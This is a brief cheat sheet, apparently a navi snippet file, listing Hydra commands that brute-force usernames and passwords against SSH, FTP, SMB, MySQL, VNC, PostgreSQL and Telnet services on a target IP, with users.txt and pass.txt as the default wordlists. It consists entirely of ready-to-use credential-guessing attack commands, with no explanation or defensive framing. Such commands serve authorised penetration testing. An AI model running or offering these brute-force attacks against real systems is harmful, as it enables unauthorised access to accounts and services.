# Hydra

% bruteforce, hydra

## Hydra - SSH - 22
```
hydra -L <userlist> -P <passlist> <ip> ssh 
```

## Hydra - FTP - 21 
```
hydra -L <userlist> -P <passlist> <ip> ftp 
```

## Hydra - SMB - 445
```
hydra -L <userlist> -P <passlist> <ip> smb
```

## Hydra - MYSQL - 3306
```
hydra -L <userlist> -P <passlist> <ip> mysql 
```

## Hydra - VNC - 5900
```
hydra -L <userlist> -P <passlist> <ip> vnc 
```

## Hydra - PostgreSQL - 5432
```
hydra -L <userlist> -P <passlist> <ip> postgres
```

## Hydra - Telnet - 23
```
hydra -L <userlist> -P <passlist> <ip> telnet 
```

= userlist: users.txt
= passlist: pass.txt
